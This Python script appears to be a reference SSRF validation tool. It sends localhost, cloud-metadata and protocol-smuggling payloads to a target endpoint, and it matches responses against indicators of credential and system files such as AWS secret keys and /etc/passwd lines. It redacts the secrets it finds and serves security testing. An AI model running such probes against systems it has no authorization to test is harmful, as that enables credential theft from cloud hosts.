#!/usr/bin/env python3
"""
SSRF validation testing script.

This is a reference implementation illustrating the complete SSRF testing pattern.
Adapt the endpoints, payloads, and detection logic to your specific application.

Usage:
    # This is a reference - adapt before running
    python validate_ssrf.py --target http://localhost:5000 --endpoint /api/fetch
"""

import requests
import hashlib
import json
import time
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

# Import payload generators
from ssrf_payloads import (
    get_localhost_payloads,
    get_cloud_metadata_payloads,
    get_metadata_bypass_payloads,
    get_protocol_payloads,
    get_url_parser_confusion_payloads,
    get_dns_rebinding_payloads,
)


@dataclass
class SSRFEvidence:
    """Evidence structure for SSRF test results."""
    status: str  # VALIDATED, FALSE_POSITIVE, PARTIAL, UNVALIDATED
    ssrf_type: str
    baseline: Optional[Dict] = None
    test: Optional[Dict] = None
    bypass_used: Optional[str] = None
    evidence: str = ""


# Content indicators for internal/cloud access
INTERNAL_INDICATORS = [
    # Linux files
    r"root:x:0:0",
    r"daemon:x:1:1",
    r"\[boot loader\]",  # Windows win.ini

    # AWS metadata
    r"ami-id",
    r"instance-id",
    r"AccessKeyId",
    r"SecretAccessKey",
    r"iam/security-credentials",

    # GCP metadata
    r"access_token.*expires_in",
    r"service-accounts",
    r"project-id",

    # Azure metadata
    r"subscriptionId",
    r"resourceGroupName",
    r"vmId",

    # Services
    r"redis_version",
    r"STAT items",  # Memcached
    r"MongoDB",
]


def redact_sensitive(content: str) -> str:
    """
    Redact sensitive information from response content.

    Args:
        content: Raw response content

    Returns:
        Content with sensitive values redacted
    """
    # AWS credentials
    content = re.sub(r'"AccessKeyId"\s*:\s*"[^"]+"', '"AccessKeyId": "[REDACTED]"', content)
    content = re.sub(r'"SecretAccessKey"\s*:\s*"[^"]+"', '"SecretAccessKey": "[REDACTED]"', content)
    content = re.sub(r'"Token"\s*:\s*"[^"]+"', '"Token": "[REDACTED]"', content)

    # GCP/Azure tokens
    content = re.sub(r'"access_token"\s*:\s*"[^"]+"', '"access_token": "[REDACTED]"', content)

    # Generic secrets
    content = re.sub(r'"password"\s*:\s*"[^"]+"', '"password": "[REDACTED]"', content)
    content = re.sub(r'"secret"\s*:\s*"[^"]+"', '"secret": "[REDACTED]"', content)
    content = re.sub(r'"api_key"\s*:\s*"[^"]+"', '"api_key": "[REDACTED]"', content)

    return content


def truncate_response(content: str, max_bytes: int = 8192) -> Tuple[str, bool]:
    """
    Truncate response to maximum size.

    Args:
        content: Response content
        max_bytes: Maximum bytes to keep

    Returns:
        Tuple of (truncated_content, was_truncated)
    """
    if len(content.encode('utf-8')) <= max_bytes:
        return content, False

    truncated = content.encode('utf-8')[:max_bytes].decode('utf-8', errors='ignore')
    return truncated + "\n[TRUNCATED]", True


def compute_hash(content: str) -> str:
    """Compute SHA-256 hash of content."""
    return f"sha256:{hashlib.sha256(content.encode()).hexdigest()[:16]}"


def has_internal_content(response_text: str) -> Tuple[bool, str]:
    """
    Check if response contains internal/cloud content indicators.

    Args:
        response_text: Response body text

    Returns:
        Tuple of (has_indicator, indicator_found)
    """
    for indicator in INTERNAL_INDICATORS:
        if re.search(indicator, response_text, re.IGNORECASE):
            return True, indicator
    return False, ""


def test_ssrf_endpoint(
    target_url: str,
    endpoint: str,
    param_name: str = "url",
    method: str = "POST",
    timeout: int = 30,
) -> SSRFEvidence:
    """
    Test an endpoint for SSRF vulnerabilities.

    Args:
        target_url: Base URL of target application
        endpoint: Endpoint path to test
        param_name: Parameter name for URL injection
        method: HTTP method (POST or GET)
        timeout: Request timeout in seconds

    Returns:
        SSRFEvidence with test results
    """
    full_url = f"{target_url.rstrip('/')}{endpoint}"

    # Phase 1: Establish baseline with external URL
    baseline_test_url = "http://example.com"
    try:
        if method.upper() == "POST":
            baseline_resp = requests.post(
                full_url,
                json={param_name: baseline_test_url},
                timeout=timeout
            )
        else:
            baseline_resp = requests.get(
                full_url,
                params={param_name: baseline_test_url},
                timeout=timeout
            )

        baseline_data = {
            "url": baseline_test_url,
            "status": baseline_resp.status_code,
            "response_snippet": truncate_response(baseline_resp.text, 1024)[0],
            "response_hash": compute_hash(baseline_resp.text),
        }
    except Exception as e:
        return SSRFEvidence(
            status="UNVALIDATED",
            ssrf_type="baseline_failed",
            evidence=f"Baseline request failed: {str(e)}"
        )

    # Phase 2: Test localhost payloads
    for payload in get_localhost_payloads():
        try:
            if method.upper() == "POST":
                resp = requests.post(
                    full_url,
                    json={param_name: payload},
                    timeout=timeout
                )
            else:
                resp = requests.get(
                    full_url,
                    params={param_name: payload},
                    timeout=timeout
                )

            has_internal, indicator = has_internal_content(resp.text)

            if resp.status_code == 200 and has_internal:
                snippet, truncated = truncate_response(redact_sensitive(resp.text))
                return SSRFEvidence(
                    status="VALIDATED",
                    ssrf_type="localhost",
                    baseline=baseline_data,
                    test={
                        "url": payload,
                        "status": resp.status_code,
                        "response_snippet": snippet,
                        "response_hash": compute_hash(resp.text),
                        "truncated": truncated,
                        "indicator_found": indicator,
                    },
                    bypass_used=_identify_bypass(payload),
                    evidence=f"Localhost access confirmed via {payload}"
                )
        except requests.exceptions.Timeout:
            continue
        except Exception:
            continue

    # Phase 3: Test cloud metadata
    for payload_info in get_cloud_metadata_payloads("all"):
        payload = payload_info["url"]
        try:
            if method.upper() == "POST":
                resp = requests.post(
                    full_url,
                    json={param_name: payload},
                    timeout=timeout
                )
            else:
                resp = requests.get(
                    full_url,
                    params={param_name: payload},
                    timeout=timeout
                )

            has_internal, indicator = has_internal_content(resp.text)

            if resp.status_code == 200 and has_internal:
                snippet, truncated = truncate_response(redact_sensitive(resp.text))
                return SSRFEvidence(
                    status="VALIDATED",
                    ssrf_type="cloud_metadata",
                    baseline=baseline_data,
                    test={
                        "url": payload,
                        "status": resp.status_code,
                        "response_snippet": snippet,
                        "response_hash": compute_hash(resp.text),
                        "truncated": truncated,
                        "description": payload_info.get("desc", ""),
                    },
                    evidence=f"Cloud metadata exposed: {payload_info.get('desc', payload)}"
                )
        except Exception:
            continue

    # Phase 4: Test protocol handlers
    for payload_info in get_protocol_payloads():
        payload = payload_info["url"]
        try:
            if method.upper() == "POST":
                resp = requests.post(
                    full_url,
                    json={param_name: payload},
                    timeout=timeout
                )
            else:
                resp = requests.get(
                    full_url,
                    params={param_name: payload},
                    timeout=timeout
                )

            has_internal, indicator = has_internal_content(resp.text)

            if resp.status_code == 200 and has_internal:
                snippet, truncated = truncate_response(redact_sensitive(resp.text))
                return SSRFEvidence(
                    status="VALIDATED",
                    ssrf_type="protocol_smuggling",
                    baseline=baseline_data,
                    test={
                        "url": payload,
                        "protocol": payload_info["protocol"],
                        "status": resp.status_code,
                        "response_snippet": snippet,
                        "response_hash": compute_hash(resp.text),
                        "truncated": truncated,
                    },
                    evidence=f"Protocol smuggling via {payload_info['protocol']}:// - {payload_info['desc']}"
                )
        except Exception:
            continue

    # If all tests blocked, it's a false positive
    return SSRFEvidence(
        status="FALSE_POSITIVE",
        ssrf_type="none",
        baseline=baseline_data,
        evidence="All SSRF payloads blocked - URL validation working correctly"
    )


def _identify_bypass(payload: str) -> Optional[str]:
    """Identify which bypass technique was used."""
    if re.match(r"http://\d+$", payload):
        return "decimal_ip"
    if "0x" in payload.lower():
        return "hex_ip"
    if re.match(r"http://0\d+\.", payload):
        return "octal_ip"
    if "[" in payload and "]" in payload:
        return "ipv6"
    if ".nip.io" in payload or ".xip.io" in payload:
        return "dns_wildcard"
    if "1u.ms" in payload:
        return "dns_rebinding"
    if "@" in payload:
        return "url_parser_confusion"
    return None


def save_evidence(evidence: SSRFEvidence, output_path: str):
    """Save evidence to JSON file."""
    with open(output_path, 'w') as f:
        json.dump(asdict(evidence), f, indent=2)
    print(f"Evidence saved to: {output_path}")


# Example usage
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="SSRF Validation Testing")
    parser.add_argument("--target", required=True, help="Target base URL")
    parser.add_argument("--endpoint", required=True, help="Endpoint to test")
    parser.add_argument("--param", default="url", help="URL parameter name")
    parser.add_argument("--method", default="POST", help="HTTP method")
    parser.add_argument("--output", default="ssrf_evidence.json", help="Output file")

    args = parser.parse_args()

    print(f"Testing {args.target}{args.endpoint} for SSRF...")
    evidence = test_ssrf_endpoint(
        target_url=args.target,
        endpoint=args.endpoint,
        param_name=args.param,
        method=args.method,
    )

    print(f"\nResult: {evidence.status}")
    print(f"Type: {evidence.ssrf_type}")
    print(f"Evidence: {evidence.evidence}")

    save_evidence(evidence, args.output)

